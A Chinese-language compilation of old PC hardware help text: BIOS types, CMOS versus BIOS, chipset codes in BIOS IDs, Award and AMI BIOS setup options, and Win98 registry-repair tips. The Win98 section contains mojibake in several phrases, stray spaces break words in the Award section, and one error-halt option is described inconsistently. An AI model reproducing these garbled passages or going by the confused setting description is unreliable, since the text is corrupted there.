　　由于BIOS直接和系统硬件资源打交道，因此总是针对某一类型的硬件系统，而各种硬件系统又各有不同，所以存在各种不同种类的BIOS，随着硬件技术的发展，同一种BIOS也先后出现了不同的版本，新版本的BIOS比起老版本来说，功能更强。
　　目前市场上主要的BIOS有AMI BIOS和Award BIOS。
　　1.AMI BIOS
　　AMI BIOS是AMI公司出品的BIOS系统软件，最早开发于80年代中期，为多数的286和386计算机系统所采用，因对各种软、硬件的适应性好、硬件工作可靠、系统性能较佳、操作直观方便的优点受到用户的欢迎。
　　90年代，AMI又不断推出新版本的BIOS以适应技术的发展，但在绿色节能型系统开始普及时，AMI似乎显得有些滞后，Award BIOS的市场占有率借此机会大大提高，在这一时期，AMI研制并推出了具有窗口化功能的WIN BIOS，这种BIOS设置程序使用非常方便，而且主窗口的各种标记也比较直观，例如，一只小兔子表示优化的默认设置，而一只小乌龟则表示保守的设置，一个骷髅用来表示反病毒方面的设置，画笔和调色板则表示色彩的设置。
　　AMI WinBIOS已经有多个版本，目前用得较多的有奔腾机主板的Win BIOS，具有即插即用、绿色节能、PCI总线管理等功能。
　　2.Award BIOS
　　Award BIOS是Award Software公司开发的BIOS产品，目前十分流行，许多586主板机都采用Award BIOS，功能比较齐全，对各种操作系统提供良好的支持。Award BIOS也有许多版本，现在用得最多的是4.X版 
CMOS与BIOS一样吗? 
CMOS是互补金属氧化物半导体的缩写。其本意是指制造大规模集成电路芯片用的一种技术或用这种技术制造出来的芯片。在这里通常是指微机主板上的一块可读写的RAM芯片。它存储了微机系统的实时钟信息和硬件配置信息等，共计128个字节。系统在加电引导机器时，要读取CMOS信息，用来初始化机器各个部件的状态。它靠系统电源和后备电池来供电，系统掉电后其信息不会丢失。 BIOS是基本输入输出系统的缩写，指集成在主板上的一个ROM芯片，其中保存了微机系统最重要的基本输入输出程序、系统开机自检程序等。它负责开机时，对系统各项硬件进行初始化设置和测试，以保证系统能够正常工作。 由于CMOS与BIOS都跟微机系统设置密切相关，所以才有CMOS设置和BIOS设置的说法。CMOS RAM是系统参数存放的地方，而BIOS中系统设置程序是完成参数设置的手段。因此，准确的说法应是通过BIOS设置程序对CMOS参数进行设置。而我们平常所说的CMOS设置和BIOS设置是其简化说法，也就在一定程度上造成了两个概念的混淆。 
BIOS的功能 
BIOS ROM 芯片不但可以在主板上看到，而且BIOS管理功能如何在很大程度上决定了主板性能是否优越。BIOS管理功能包括：
1.BIOS中断服务程序实质上是微机系统中软件与硬件之间的一个可编程接口，主要用于程序软件功能与微机硬件之间 接。例如,WINDOWS98对软驱,光驱,硬盘等管理,中断的设置等服务、程序。
2. BIOS系统设置程序：微机部件配置记录是放在一块可写的CMOS RAM芯片中的，主要保存着系统的基本情况,CPU特性,软硬盘驱动器等部件的信息。在BIOS ROM 芯片中装有“系统设置程序”，主要来设置CMOS RAM中的各项参数。这个程序在开机时按某个键就可进入设置状态，并提供良好的界面。
3.POST上电自检：微机接通电源后，系统首先由(Power On Self Test,上电自检)程序来对内部各个设备进行检查。通常完整的POST自检将包括对CPU,640K基本内存,1M以上的扩展内存,ROM,主板,CMOS存储器,串并口,显示卡,软硬盘子系统及键盘进行测试，一旦在自检中发现问题，系统将给出提示信息或鸣笛警告。
4. BIOS系统启动自举程序：系统完成POST自检后，ROM BIOS就首先按照系统CMOS设置中保存的启动顺序搜索软硬盘驱动器及CD-ROM,网络服务器等有效地启动驱动器，读入操作系统引导记录，然后将系统控制权交给引导记录，并由引导记录来完成系统的顺序启动。 
主板BIOS ID中芯片组的编码信息 
2A69K:Intel 440BX chipset (Pentium Ⅱ based chipset)
　　2A69J:Intel 440LX chipset (Pentium Ⅱ based chipset)
　　2A69H:Intel 440FX chipset (Pentium Ⅱ/Pentium Pro based chipset)
　　2A59C:Intel Triton FX chipset (Socket 7 based m/b)
　　2A59F:Intel Triton Ⅱ HX chipset (Socket 7 based m/b)
　　2A59G:Intel Triton VX chipset (Socket 7 based m/b)
　　2A59H:Intel Triton VX chipset (Socket 7 based m/b)
　　2A59I:Intel Triton TX chipset (Socket 7 based m/b)
　　2A59A:Intel Natoma (Neptune) Chipset
　　2A597:Intel Mercury Chipset
　　2A59B:Intel Mercury Chipset
　　2A5C7:VIA VT82C570 Chipset
　　2A5G7:VLSI VL82C594 Chipset
　　2A5GB:VLSI Lynx VL82C541/VL82C543
　　2A5IA:SiS 501/02/03 Chipset
　　2A5IC:SiS 5501/02/03 Chipset
　　2A5ID:SiS 5511/12/13 Chipset
　　2A5IE:SiS 5101－5103 chipset
　　2A5IF:SiS 5596 chipset
　　2A5IH:SiS 5571 Chipset
　　2A5Ⅱ:SiS 5598 Chipset
　　2A5IK:SiS 5591 Chipset
　　2A5KB:Ali 1449/61/51 Chipset
　　2A5KF:ALI 1521/23 Chipset
　　2A5KI:ALI IV＋ M1531/M1543 Chipset 
　　2A5LA:VIA Apollo VP1 Chipset (VT82C580VP) 
　　2A5LC:VIA Apollo VP2 Chipset 
　　2A5LD:VIA VPX Chipset 
　　2A5LE:VIA Apollo (M)VP32A5L7:VIA VT82C570
　　2A5L9:VIA VT82C570M
　　2A5R5:Forex 601A－613 Chipset
　　2A5UI:Opti 82C822/596/597 Chipset
　　2A5UL:Opti 82C822/571/572 Chipset
　　2A5UM:Opti 82C822/546/547 Chipset
　　2A5UN:Opti Viper－M 82C556/557/558 Chipset or Opti Viper 82C556/557/558
　　2A5X7:UMC 82C890 Chipset
　　2A5X8:UMC UM8886BF/UM8891BF/UM8892BF Chipset
　　2A4H2:Contaq 82C596－9 Chipset
　　2A4IB:SiS 496/497 Chipset
　　2A4KC:Ali 1439/45/31 Chipset
　　2A4KD:Ali 1489 Chipset
　　2A4L4:VIA 486A/482/505 Chipset
　　2A4L6:VIA 496/406/505 Chipset
　　2A4UK:OPTI－802G－822
　　2A4X5:UMC 8881/8886 Chipset
　　2C403:EFAR EC802G－B Chipset
　　2C4I8:SiS 471B/E Chipset 
　　2C4I9:SIS 85C471B/E/G Chipset
　　2C4K9:ALI 14296 Chipset
　　2C4L2:VIA 82C486A Chipset
　　2C4L6:VIA VT496G Chipset
　　2C4UK:OPTI － 802G
　　2C4X2:UMC UM82C491/82C493 chipset
　　2C4X6:UMC UM498F/496F
　　2A431:Cyrix 5510 chipset (MediaGx) 
AWARD BIOS设置手册 
　AWARD BIOS是目前兼容机中应用较为广泛的一种BIOS，但是由于里面的信息全为英文且需要用户对于相关专业知识的理解相对深入，所以有些用户设置起来感到困难很大。如果这些有关信息设置不当的话，将会大大影响整台电脑主机的性能。下面介绍一AWARD BIOS中的有关设置选项的含义和设置方法,AWARD BIOS的主菜单主要有以下几个菜单项： 
Standard CMOS Setup(标准CMOS设定)：
在本菜单中，用户可以修改日期、时间、第一主IDE设备(硬盘)和IDE设备(硬盘或CD－ROM)、第二个主IDE设备 (硬盘或CD－ROM)和从IDE设备(硬盘或CD－ROM)、软驱A与B、显示系统的类型、什么出错状态要导致系统启动暂停等。 
　　说明：
　　(1)用户可以在Type(类型)和Mode(模式)项设置 为Auto，使BIOS自动检测硬盘。也可以在主菜单中的IDE HDD Auto Detection操作来设置。用户还可以使用User选 项，手动设定硬盘的参数。您必须输入柱面数(Cyls)，磁 头数 (Heads)，写预补偿(Precomp)，磁头着陆区(Landz) ，每柱面扇区数(Sectorxs)，工作模式(Mode)等几种参数 。硬盘大小在上述参数设定后自动产生。 
　　(2) 显示类型可选EGA/VGA(EGA、VGA、SEGA、SV GA、PGA显示适配卡选用)、CGA 40(CGA显示卡，40列方式 )、CGA80(CGA显示卡，80列方式)、MONO(单色显示方式， 包括高分辨率单显卡 )等四种，用户应根据情况正确选用 。 
　　(3) 暂停的出错状态选项有：All Errors(BIOS 检测到任何错误，系统启动均暂停并且给出出错提示)、N o Errors (BIOS检测到任何错误都不使系统启动暂停)、A ll But Keyboard(BIOS检测到除了磁盘之外的错误后使系 统启动暂停，磁盘错误暂停)、All But Disk/Key(BIOS检 测到除了键盘或磁盘之外的错误后使系统启动暂停。 
BIOS Features Setup(BIOS功能设定) 
　　该项用来设置系统配置选项清单，其中有些选项 由主板本身设计确定，有些选项用户可以进行修改设定， 以改善系统的性能。主要说明如下： 
　　(1) CPU Internal Cache:缺省为Enable(开启) ，它允许系统使用CPU内部的第一级Cache。486、586档次 的CPU内部一般都带有Cache，除非当该项设为开启时系统 工作不正常，此项一般不要轻易改动。该项若置为Disabl e(关闭)，将会降低系统的性能。 
　　(2) External Cache：缺省设为Enable，它用来 控制主板上的第二级(L2)Cache。根据主板上是否带有Cac he，选择该项的设置。
　　(3) Quick Power On Self Test：缺省设置为En able，该项主要功能为加速系统上电自测过程，它将跳过 一些自测试。使引导过程加快。 
　　(4) Hard Disk Boot From:选择由主盘、从盘或 SCSI硬盘启动。 
　　(5) Boot Sequence：选择机器开电时的启动顺 序。当机器开电时，有以下四种启动顺序： 
　　C，A　　　系统将按硬盘，软驱顺序寻找启动盘
　　A，C　　　系统将按软驱，硬盘顺序寻找启动盘
　　CDROM，C，A　系统按CDROM，硬盘，软驱顺序寻 找启动盘 
　　C，CDROM，A　系统按硬盘，CDROM，软驱顺序寻 找启动盘 
　　请注意，某些老式主板并不支持由CD－ROM启动 。 
　　现在的新主板增加了更多的启动顺序如D，A；LS 120，C；ZIP，C等。 
　　(6) Swap Floppy Drive:(交换软盘驱动器)缺省 设定为Disable。当它Disable时，BIOS把软驱连线扭接端 子所接的软盘驱动器当作第一驱动器。当它开启时，BIOS 将把软驱连线对接端子所接的软盘驱动器当作第一驱动器 ，即在 DOS下A盘当作B盘用，B盘当作A盘用。 
　　(7) Boot Up Floppy Seek：当Enable时，机器 启动时BIOS将对软驱进行寻道操作。 
　　(8) Floppy Disk Access Contol：当该项选在R /W状态时，软驱可以读和写，其它状态只能读。 
　　(9) Boot Up Numlock Strtus:该选项用来设置 小键盘的缺省状态。当设置为ON时，系统启动后，小键盘 的缺省为数字状态；设为 OFF时，系统启动后，小键盘的 状态为箭头状态。 
　　(10) Boot Up System Speed：该选项用来确定 系统启动时的速度为 HIGH还是LOW。 
　　(11)Typematic Rate Setting:该项可选Enable 和 Disable。当置为Enable时，如果按下键盘上的某个键 不放，机器按您重复按下该键对待；当置为 Disable时， 如果按下键盘上的某个键不放，机器按键入该键一次对待 。 
　　(12) Typematic Rate:如果(11)选项置为Enable ，那么可以用此选项设定当您按下键盘上的某个键一秒钟 ，那么相当于按该键6次。该项可选6、8、10、12、15、2 0、24、30。
　　(13) Typematic Delay：如果(11)选项置为Enab le，那么可以用此选项设定按下某一个键时，延迟多长时 间后开始视为重复键入该键。该项可选250、500、750、1 000，单位为毫秒。 
　　(14) Security Option:选择System时，每次开 机启动时都会提示您输入密码，选择Setup时，仅在进入C MOS Setup时会提示您输入密码。 
　　(15)PS/2 Mouse Function Control：当该项设 为Enable，机器提供对于PS/2类型鼠标的支持。否则，选 Disable。 
　　(16) Assign PCI IRQ For VGA:选Enable时，机 器将自动设定PCI显示卡的IRQ到系统的DRAM中，以提高显 示速度和改善系统的性能。 
　　(17) PCI/VGA Palett Snoop：该项用来设置PCI /VGA卡能否与MPEG ISA/VESA VGA卡一起用。当PCI/VGA卡 与MPEG ISA/VESA VGA卡一起用时，该项应设为Enable,否 则，设为 Disable。 
　　(18) OS Select For DRAM>64MB：该项允许您在 OS/2操作系统中，使用64M以上的内存。该项可选为NON－ OS2，OS2。 
　　(19) System BIOS Shadow:该选项的缺省设置默 认为Enable，当它开启时，系统BIOS将拷贝到系统Dram中 ，以提高系统的运行速度和改善系统的性能。
　　(20) Video BIOS Shadow:缺省设定为开启(Enab le)，当它开启时，显示卡的BIOS将拷贝到系统DRAM中， 以提高显示速度和改善系统的性能。
　　(21) C8000－CBFFF Shadow/DFFFF Shadow:这些 内存区域用来作为其他扩充卡的 ROM映射区，一般都设定 为禁止(Disable)。如果有某一扩充卡ROM需要映射，则用 户应搞清楚该 ROM将映射地址和范围，可以将上述的几个 内存区域都置为 Enable;但这样将造成内存空间的浪费。 因为映射区的地址空间将占用系统的 640K～1024K之间的 某一段内存。 
Chipset Features Setup(芯片组功能设定) 
该项用来设置系统板上芯片的特性。它有以下选项：
　　(1) ISA Bus Clock frequency(PCICLK/4)ISA传 输速率率设定 
　　设定值有：PCICLK/3；PCICLK/4。 
　　(2) Auto Configuration(Enabled)自动状态设 定 
　　当设定为Enabled时BIOS依最佳状况状态设定， 此时BIOS会自动设定DRAM Timing，所以会有无法修改DRA M的细项时序，我们强烈建议选用Enabled，因为任意改变 DRAM的时序可能造成系统不稳或不开机。
　(3) Aggressive Mode(Disabled)高级模式设定 
　　当您想获得较好的效能时，而且系统在非常稳定 状态下，可以尝试 Enabled此项功能以增加系统效能，不 过必须使用较快速DRAM(60ns以下)。 
Power Management Setup(节电功能设定) 
　　该项为电源管理设定，用来控制主板上的“绿色 ”功能。该功能定时关闭视频显示和硬盘驱动器以实现节 能的效果。 
　　具体来说，实现节电的模式有四种： 
　　1、Doze模式　　　　当设定时间一到，CPU时钟 变慢，其他设备照常运作；
　　2、Standby模式　　当设定时间一到，硬盘和显 示将停止工作，其他设备照常运作； 
　　3、Suspend模式　　当设定时间一到，除CPU以 外的所有设备都将停止工作；
　　4、HDD Power Down模式　当设定时间一到，硬 盘停止工作，其他设备照常运作。
　　该菜单项下面的可供选择的内容有以下几种： 
　 　　(1) Power Management节电模式的主控项，有四 种设定：
　　Max Saving(最大节电)在一个较短的系统不活动 的周期 (Doze、Standby、Suspend、HDD Power Down四种 模式的缺省值均为1分钟)以后，使系统进入节电模式，这 种模式节电最大。
　　MIN Saving(最小节电)在一段较长的系统不活动 的周期在这种情况下， (Doze,Standby,Suspend三种模式 的缺省值均为 1小时，HDD Power Down模式的缺省值为15 分钟 )后，使系统进入节电模式。 
　　Disable　关闭节电功能，是缺省设置。 
　　User Defined(用户定义)允许用户根据自己的需 要设定节电的模式。 
　　(2) Video Off Method(视频关闭)该选项可设为 V/H Sync＋Blank、Dpms、Blank Screen三种。
　　V/H Sync＋Blank将关闭显示卡水平与垂直同步 信号的输出端口，向视频缓冲区写入空白信号。
　　DPMS(显示电源管理系统)设定允许BIOS在显示卡 有节电功能时，对显示卡进行节能信息的初始化。只有显 示卡支持绿色功能时，用户才能使用这些设定。如果没有 绿色功能，则应将该行设定为Blank Screen(关掉屏幕)。
　　Blank Screen(关掉屏幕)当管理关掉显示器屏幕 时，缺省设定能通过关闭显示器的垂直和水平扫描以节约 更多的电能。没有绿色功能的显示器，缺省设定只能关掉 屏幕而不能终止 CRT的扫描。
　　(3) PM Timers(电源管理记时器)下面的几项分 别表示对电源管理超时设置的控制。Doze,Stand By和Sus pend Mode项设置分别为该种模式激活前的机器闲置时间 ，在MAX Saving模式，它每次在一分钟后激活。在MIN Sa ving模式，它在一小时后激活。
　　(4)Power Down和Resume Events(进入节电模式 和从节电状态中唤醒的事件 )。该项下面所列述的事件可 以将硬盘设在最低耗电模式，工作、等待和悬挂系统等非 活动模式中若有事件发生，如敲任何键或 IRQ唤醒、鼠标 动作、 MODEM振铃时，系统自动从电源节电模式下恢复过 来。 
　　(5)Soft－Off By Pwr－Bttn:ATX机箱的设计不 同于传统机箱，按下开关4秒以上才能关闭系统；选择ins tant－off方式将使ATX机器等同于传统机器，而若置为de lay 4 sec方式，那么您按住开关的时间不足4秒时将使系 统进入Suspend Mode。 
PNP/PCI Configuration Setup(即插即用与PCI状态 设定 ) 
　　该菜单项用来设置即插即用设备和PCI设备的有 关属性。 
　　(1)PNP OS Installed：如果软件系统支持Plug －Play,如Win 95，可以设置为YES。 
　　(2)Resources Controlled By：AWARD BIOS支持 “即插即用”功能，可以检测到全部支持“即插即用”的 设备，这种功能是为类似 Win95之类操作系统所设计，可 以设置Auto(自动)或Manual(手动)。 
　　(3) Resources Configuration Data：缺省值是 Disabled，如果选择Enabled，每次开机时，Extend Syst em Configuration Data(扩展系统设置数据)都会重新设 置。
　　(4)IRQ3/4/5/7/9/10/11/12/14/15， Assingned To：在缺省状态下，所有的资源除了IRQ3/4，都设计为 被PCI设备占用，如果某些ISA卡要占用某资源可以手动设 置。 
Intergrated Peripherals Setup(外部设备设定) 
　　该菜单项用来设置集成主板上的外部设备的属性 。
　　(1) IDE HDD Block Mode：如果选择Enable,可 以允许硬盘用快速块模式 (Fast Block Mode)来传输数据 。
　　(2) IDE PIO Mode　这个设置取决于系统硬盘的 速度，共有AUTO，0，1，2，3，4五个选项，Mode4硬盘传 输速率大于是 16.6MB/秒，其它模式的小于这个速率。请 不要选择超过硬盘速率的模式，这样会丢失数据。
　　(3) IDE UMDA(Ultra DMA)Mode:Intel 430TX芯 片提供了Ultra DMA Mode，它可以把传输速率提高到一个 新的水准。 
Load BIOS Defaults(装入BIOS缺省值) 
　　主机板的CMOS中有一个出厂时设定的值。若CMOS 内容被破坏，则要使用该项进行恢复。由于BIOS缺省设定 值可能关掉了所有用来提高系统的性能的参数，因此使用 它容易找到主机板的安全值和除去主板的错误。 
　　该项设定只影响BIOS和Chipset特性的选定项。 不会影响标准的CMOS设定。移动光标到屏幕的该项然后按 下 y键，屏幕显示是否要装入BIOS缺省设定值，回 答Y即装入，回答N即不装入。选择完后，返回主菜单。 
Supervisor Password And User Password Setup(管 理者与使用者密码设定 ) 
　　User Passowrd Setting功能为设定密码。如果 要设定此密码，首先应输入当前密码，确定密码后按y，屏幕 自动回到主画面。输入User Passowrd可以使用系统，但不 能修改CMOS的内容。输入Supervisor Password可以输入、 修改CMOS BIOS的值，Supervisor Password是为了防止他 人擅自修改CMOS的内容而设置的。 用户如果使用IDE硬盘驱动器，该项功能可以自 动读出硬盘参数，并将它们自动记入标准CMOS设定中，它 最多可以读出四个 IDE硬盘的参数。 
　以上介绍了Award BIOS Setup的常用选项的含义 及设置办法。更改设置后，请选 Save and Exit Setup项 来保存修改的内容，以便使所修改的内容生效。
AMI BIOS设置手册 
进入AMI BIOS设定程序
　　1.打开系统电源或重新启动系统，显示器屏幕将出现自我测试的信息；
　　2. 当屏幕中间出现"Press <Del> to enter setup"提示时，按下<Del>键，就可以进入BIOS设定程序。
　　3. 以方向键移动至你要修改的选项，按下<Enter>键即可进入该选项的子画面；
　　4. 使用 方向键及〈Enter〉键即可修改所选项目的值，也可用鼠标（包括PS/2鼠标）选择BIOS选项并修改。
　　5. 任何时候按下<Esc>键即可回到上一画面；
　　6. 在主画面下，按下<Esc>键，选择“Saving Changes And Exit"即可储存你的新设定并重新启动系统。选择“Exit Without Saving"，则会忽略你的改变而跳出设定程序。
　　Standard Setup（标准设定）窗口
　　Date/Time: 显示当前的日期/时间，可修改。
　　Floppy Drive A，B: 设定软盘驱动器类型为None/720K/1.2M/1.44M/2.88M 。
　　Pri Master/Slave以及Sec Master/Slave: 此选项可设定:
　　HDD Type（硬盘类型）: Auto(自动检测)、SCSI(SCSI HDD)、CD－ROM驱动器、Floptical(LS－120大容量软驱)或是Type 1～47等IDE设备。
　　LBA/Large: 硬盘LBA/Large 模式是否打开。目前540M以上的硬盘都要将此选项打开(On)，但在Novell Netware 3.xx或4.xx版等网络操作系统下要视情况将它关掉(Off)。
　　Block Mode: 将此选项设为On，有助于硬盘存取速度加快，但有些旧硬盘不支持此模式，必须将此选项设为Off。
　　32 Bit Mode: 将此选项设为On，有助于在32位的操作系统（如WIN95/NT）下加快硬盘传输速度，有些旧硬盘不支持此模式，必须将此选项设为Off。
　　PIO Mode: 支持PIO Mode0～Mode5(DMA/33)。用BIOS程序自动检查硬盘时，会自动设置硬盘的PIO Mode。
　　注意：当你在系统中接上一台IDE设备（如硬盘、光驱等）时，最好进入BIOS，让它自动检测。如果使用的是抽屉式硬盘的话，可将Type设成Auto，或将Primary以及Secondary的Type都改成Auto 即可。所谓Primary指的是第一IDE接口，对应于主板上的IDE0插口，Secondary指的是第二IDE接口，对应于主板上的IDE1插口。每个IDE接口可接Master/Slave（主/从）两台IDE设备。
　　Advanced Setup（高级设定）窗口
　　1st/2rd/3rd/4th Boot Device: 开机启动设备的顺序，可选择由IDE0～3、SCSI、光驱、软驱、 Floptical (LS－120大容量软驱)或由Network(网络)开机。
　　S.M.A.R.T For HardDisk: 开启（Enable）硬盘S.M.A.R.T功能。如果硬盘支持，此功能可提供硬盘自我监控的功能。
　　Quick Boot: 开启此功能后，可使开机速度加快。
　　Floppy Drive Swap: 若将此功能Enable，可使A驱与B驱互换。
　　PS/2 Mouse Support : 是否开启PS/2鼠标口，若设定为Enable，则开机时，将IRQ12保留给PS/2鼠标使用，若设定为Disable，则IRQ12留给系统使用。
　　Password Check: 设定何时检查Password(口令)，若设定成Setup时，每次进入BIOS设定时将会要求输入口令，若设定成Always时，进入BIOS或系统开机时，都会要求输入口令，但先决条件是必须先设定口令(Security窗口中的User选项)。
　　Primary Display: 设定显示卡的种类。
　　Internal Cache: 是否开启CPU内部高速缓存（L1 Cache），应设为Enable。
　　External Cache: 是否开启主板上的高速缓存（L2 Cache），应设为Enable。
　　System BIOS Cacheable: 是否将系统BIOS程序复制到内存中，以加快BIOS存取速度。
　　C000－DC00，16K Shadow: 此8项是将主内存的UpperMemory（上位内存区）开启，将所有插卡上ROM程序映射到内存中，以加快CPU对BIOS的执行效率。Disable:不开启本功能；Enable:开启，且可提供读写区段功能；Cached:开启，但不提供读写功能。
　　Chipset Setup（芯片组设定）窗口
　　本功能中的选项有助于系统效率的提升，建议使用默认值。若将某些Chipset、DRAM/SDRAM或SRAM部分的Timing值设得过快，可能会导致系统"死机"或运行不稳定，这时可试着将某些选项的速度值设定慢一点。
　　USB Function Enabled: 此选项可开启USB接口的功能，如没有USB设备，建议将此选项设为Disable，否则会浪费一个IRQ资源。
　　DRAM Write Timing: 设定DRAM的写入时序，建议值如下:
　　70ns DRAM: X－3－3－3； 60ns DRAM: X－2－2－2。
　　Page Mode DRAM Read Timing: 设定DRAM读取时序，建议值如下 :
　　70ns DRAM: X－4－4－4； 60ns DRAM: X－3－3－3。
　　RAS Precharge Period: 设定DRAM/EDO RAM的Precharge（预充电）时间，建议设成4T。
　　RAS to CAS Delay Time: 设定DRAM中RAS到CAS延迟时间，建议设定成3T。
　　EDO DRAM Read Timing: 设定EDO DRAM读取时序，建议值如下:
　　70ns DRAM : X－3－3－3； 60ns DRAM : X－2－2－2。
　　DRAM Speculative Read: 此选项是设定DRAM推测性的引导读取时序，建议设定成Disable。
　　SDRAM CAS Latency: 设定SDRAM的CAS信号延迟时序，建议设定值如下 :
　　15ns(66MHz)/12ns(75MHz) SDRAM: 3
　　10ns(100MHz) SDRAM: 2。
　　SDRAM Timing: 设定SDRAM(同步内存)的时序，建议设定值如下:
　　15ns(66MHz)/12ns(75MHz) SDRAM: 3－6－9
　　10ns(100MHz) SDRAM: 3－4－7。
　　注意：若系统使用SDRAM不稳时，建议将SDRAM速度调慢。
　　SDRAM Speculative Read : 此选项是设定SDRAM推测性的引导读取时序，建议设定成Disable。
　　Pipe Function: 此选项设定是否开启Pipe Function（管道功能），建议设定成Enable。
　　Slow Refresh: 设定DRAM的刷新速率，有15/30/60/120us ，建议设在60us。
　　Primary Frame Buffer: 此选项保留，建议设定成Disable。
　　VGA Frame Buffer: 设定是否开启VGA帧缓冲，建议设为Enable。
　　Passive Release: 设定Passive Release（被动释放）为Enable时，可确保CPU与PCI总线主控芯片（PCI Bus Master）能随时重获对总线的控制权。
　　ISA Line Buffer: 是否开启ISA总线的Line Buffer，建议设为Enable。
　　Delay Transaction: 设定是否开启芯片组内部的Delay Transaction（延时传送），建议设成 Disable。
　　AT Bus Clock: 设定ISA总线时钟，建议设成Auto。
　　Power Management Setup（能源管理）窗口
　　能源管理功能可使大部份周边设备在闲置时进入省电功能模示，减少耗电量，达到节约能源的目的。电脑在平常操作时，是工作在全速模式状态，而电源管理程序会监视系统的图形、串并口、硬盘的存取、键盘、鼠标及其他设备的工作状态，如果上述设备都处于停顿状态，则系统就会进入省电模式，当有任何监控事件发生，系统即刻回到全速工作模式的状态。省电模式又分为“全速模式(Normal)、打盹模式(Doze)、待命模式(Standby)、沉睡模式(Suspend)"，系统耗电量大小顺序:Normal>Doze>
　　Standby > Suspend。
　　Power Management/APM: 是否开启APM省电功能。若开启(Enable)，则可设定省电功能。
　　Green PC Monitor Power State/Video Power Down Mode/Hard Disk Power Down Mode : 设定显示器、显示卡以及硬盘是否开启省电模式，可设定成Standby、Suspend以及Off(即不进入省电模式)。
　　Video Power Down Mode: 设定显示器在省电模式下的状态 :Disable: 不设定 ；Stand By: 待命模式；Suspend: 沉睡模式。
　　Hard Disk Power Down Mode: 设定硬盘在省电模式下的状态。（同上）
　　Standby Timeout/Suspend Timeout: 本选项可设定系统在闲置几分钟后，依序进入Standby Mode/Suspend Mode等省电模式。
　　Display Activity: 当系统进入Standby Mode时，显示器是否进入省电模示，Ingroe:忽略不管；Monitor:开启。
　　Monitor Serial Port/Paralell Port/Pri－HDD/Sec－ HDD/VGA /Audio/Floppy: 当系统进入省电模式后，是否监视串并行口、主从硬盘、显示卡、声卡、软驱的动作。Yes:监视，即各设备如有动作，则系统恢复到全速工作模式；No:不监视。
　　Power Button Override: 是否开启电源开关功能。
　　Power Button Function: 此选项是设定当使用ATX电源时，电源按扭（SUS－SW）的作用。 Soft Off: 按一次就进入Suspend Mode，再按一次就恢复运行。Green: 　　按第一下便是开机，关机时要按住4秒。
　　Ring resume From Soft Off:是否开启Modem唤醒功能。
　　RTC Alarm Resume From Soft Off: 是否设定BIOS 定时开机功能。
　　PCI/PnP Setup窗口
　　此选项可设定即插即用(PnP)功能。
　　OnBoard USB: 是否开启芯片组中的USB功能。
　　Plug and Play Aware OS: 如你的操作系统(OS)具有PnP功能(如 Win95)，此项应选Yes；若不是，则选No。如某些PnP卡无法检测到时，建议设成No。
　　PCI Latency Timer: 此选项可设定PCI时钟的延迟时序。
　　Offboard PCI IDE Card: 如使用了其它的PCI IDE卡，则此项必须设定，这要视你的PCI IDE卡是插在哪个Slot(1－4)上而定，并设定以下各IDE IRQ 值。Slot5、6以及Hardwared为保留选项。
　　Offboard PCI IDE Primary IRQ: 设定PCI IDE卡上IDE 0所要占用的INT＃，一般都是设定成INT＃A。
　　Offboard PCI IDE Secondary IRQ: 设定PCI IDE卡上IDE 1所要占用的INT＃，一般都是设定成 INT＃B。
　　Assign IRQ to PCI VGA Card: 指定一个IRQ给VGA卡使用，一般不用指定IRQ给VGA卡。
　　IRQ 3、4、5、7、9、10、11、12、14、15/DMA Channel 0、1、3、5、6、7:本选项是设定各IRQ/DMA是否让PnP卡自动配置，若设定成PCI/PnP，则BIOS检测到PnP卡时，会挑选你所有设成PCI/PnP状态的其中一个IRQ/DMA来使用；反之，若设成ISA/EISA，则BIOS将不会自动配置。一般设为PCI/PnP。
　　Peripheral Setup（外围设备设定）窗口
　　Onboard FDC: 是否启用主板上的软驱接口。
　　Onboard Serial Port 1: 选择串行口1（COM1）的地址，一般设成Auto。
　　Serial Port1 IRQ: 此选项可设定串行口1的IRQ，建议设成4。
　　Onboard Serial Port 2: 选择串行口2的地址， 一般设成Auto。
　　Serial Port2 Mode : 若设成 Normal，为一般接鼠标、Modem用；如有红外线装置(IrDA)，则建议设成IrDA ASKIR。
　　Serial Port2 IRQ: 此选项可设定串行口2的IRQ，建议设成3。
　　Onboard Parallel Port: 选择并行口的地址。
　　Onboard Parallel Mode: 选择并行口的传输模式(ECP/EPP/Normal)。默认为标准模式(Normal)。
　　Parallel Mode IRQ : 设定并行口IRQ，建议设定成7。
　　EPP Version: 设定EPP Mode为1.7或1.9 版。
　　Onboard IDE : 是否启用主板上的PCI IDE0、IDE1接口。如果采用外接的IDE卡，则此项必须改成Disable，反之则设成Both。此选项若设错，将会导致硬盘、光驱等IDE设备检测不到。
　　Security(安全）窗口
　　User:允许User(用户)设定密码，输入密码后，必须再输入一次确认。
　　Anti－Virus：此选项开启后，可防止病毒入侵硬盘的Boot区以及BIOS。
　　Utility (实用)窗口
　　Detect IDE：此功能可以自动检测所有接在IDE0及IDE1上的设备，包括硬盘、CD－ROM、LS－120等，且会自动判断其PIO模式，以及LBA/Normal/Large模式，一次即可检测完毕。 
关于系统崩溃，非法操作
防止系统崩溃 
£牐犖蘼鄣谌ý方工具的功能多么强大，能修则修始终是我们最先考虑的方案，而重装Win98实在是迫不得已而为之。修复出错的Win98情况非常复杂，对于新手而言，如果使用了以下几招仍未见效，再去深究可能事倍功半，不如转而考虑其它办法。 
£牐犕耆«卸载软件:有些朋友在卸载程序时，没有采用正常的卸载方法，而是直接将该程序所在文件夹删除，有可能造成系统启动时找不到文件，此时应该将该程序重新安装，再从“控制面板→添加/删除程序”中或从程序组中进行卸载。 
£牐牷指醋⒉岜í:注册表是Win98存放系统关键信息的文件，当由于频繁、错误地装卸软件或遭病毒破坏等原因造成注册表损坏时，操作系统也就会产生各种各样的问题，这时应该利用备份注册表进行恢复。备份注册表的方法有几种:一是备份Windows目录下的System.dat和User.dat两个文件，恢复时只须将备份文件覆盖目标文件；二是从“开始→运行”中执行注册表编辑器Regedit.exe，然后选择“注册表→导出注册表文件”(图1)，导出范围选为全部，恢复时从注册表编辑器中选择“导入注册表文件”，将先前保存的文件导入；三是运行Scanregw进行备份，但恢复时也需使用该命令。如果没有手工备份注册表，也不要着急，Win98已经为我们备份了最近5次开机时的注册表，保存在Windows＼Sysbckup下的5个压缩包中，恢复时进入纯DOS状态，进入Windows目录执行“Scanreg /Restore”，从5个不同时间的注册表中选择要恢复的即可。 
